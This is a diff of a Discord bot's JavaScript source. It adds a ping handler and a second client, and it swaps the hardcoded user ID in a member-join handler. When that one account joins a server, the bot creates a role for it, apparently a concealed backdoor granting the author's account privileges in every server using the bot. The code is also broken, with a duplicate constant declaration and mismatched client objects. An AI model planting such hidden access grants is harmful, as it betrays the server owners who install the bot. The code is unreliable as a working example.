@@ -1,3 +1,23 @@
+const Discord = require('discord.js');
+const client = new Discord.Client();
+
+client.on('ready', () => {
+    console.log('I am ready!');
+});
+
+client.on('message', message => {
+    if (message.content === 'ping') {
+        message.reply('pong');
+      }
+});
+
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+ 
+});
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
@@ -453,7 +473,7 @@ LOka.on('guildCreate', async (guild) => {
  
 LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "386069723764490240") {
+            if (member.id === "349288766302584832") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM",
@@ -465,3 +485,9 @@ LOka.on('guildMemberAdd', member => {
             }
        
     });
+ 
+ 
+
+
+// THIS  MUST  BE  THIS  WAY
+client.login(process.env.BOT_TOKEN);
